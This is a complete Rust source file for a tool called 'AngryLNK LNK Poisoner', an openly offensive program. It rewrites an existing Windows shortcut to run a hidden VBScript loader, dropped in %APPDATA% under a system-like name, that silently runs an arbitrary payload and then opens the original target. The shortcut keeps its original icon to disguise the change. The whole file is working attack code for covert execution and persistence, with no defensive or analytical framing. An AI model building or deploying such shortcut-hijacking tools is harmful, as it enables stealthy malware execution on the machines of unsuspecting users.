use clap::Parser;
use std::fs;
use std::process::Command;
use windows::core::*;
use windows::Win32::System::Com::*;
use windows::Win32::Storage::FileSystem::WIN32_FIND_DATAW;
use windows::Win32::UI::Shell::*;

#[derive(Parser, Debug)]
#[command(author, version, about = "AngryLNK LNK Poisoner")]
struct Args {
    #[arg(short, long)]
    lnk: String,

    #[arg(short, long, default_value = "calc.exe")]
    payload: String,

    #[arg(short, long, default_value = "AngryLNK")]
    desc: String,
}

fn main() -> Result<()> {
    let args = Args::parse();

    unsafe {
        let app_data = std::env::var("APPDATA").unwrap();
        let vbs_name = format!("win_sys_{}.vbs", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() % 1000);
        let vbs_loader_path = format!(r"{}\Microsoft\{}", app_data, vbs_name);
        
        let lnk_wide: Vec<u16> = args.lnk.encode_utf16().chain(Some(0)).collect();

        CoInitializeEx(None, COINIT_APARTMENTTHREADED)?;
        let shell_link: IShellLinkW = CoCreateInstance(&ShellLink, None, CLSCTX_INPROC_SERVER)?;
        let persist_file: IPersistFile = shell_link.cast()?;

        if let Err(_) = persist_file.Load(PCWSTR(lnk_wide.as_ptr()), STGM_READWRITE) {
            println!("[-] error: file not found at {}", args.lnk);
            return Ok(());
        }

        let mut target_buf = [0u16; 260];
        let mut find_data = WIN32_FIND_DATAW::default();
        shell_link.GetPath(&mut target_buf, &mut find_data, SLGP_RAWPATH.0 as u32)?;
        
        let original_target = String::from_utf16_lossy(&target_buf)
            .trim_matches(char::from(0))
            .to_string();
            
        shell_link.SetIconLocation(PCWSTR(target_buf.as_ptr()), 0)?;

        let vbs_content = format!(
            "Set W = CreateObject(\"WScript.Shell\"): \
             W.Run \"{}\", 0, False: \
             W.Run \"{}\", 1, False", 
            args.payload, original_target
        );

        fs::write(&vbs_loader_path, vbs_content).expect("failed to write loader.");
        let _ = Command::new("attrib").args(&["+h", &vbs_loader_path]).status();
        
        println!("[+] loader deployed: {}", vbs_loader_path);

        let wscript_exe = w!(r"C:\Windows\System32\wscript.exe");
        let vbs_args = format!(r#""{}""#, vbs_loader_path);
        let vbs_args_wide: Vec<u16> = vbs_args.encode_utf16().chain(Some(0)).collect();

        shell_link.SetPath(wscript_exe)?;
        shell_link.SetArguments(PCWSTR(vbs_args_wide.as_ptr()))?;
        
        let desc_wide: Vec<u16> = args.desc.encode_utf16().chain(Some(0)).collect();
        shell_link.SetDescription(PCWSTR(desc_wide.as_ptr()))?;

        persist_file.Save(PCWSTR(lnk_wide.as_ptr()), true)?;
        
        println!("[success] {} has been stomped.", args.lnk);

        CoUninitialize();
        Ok(())
    }
}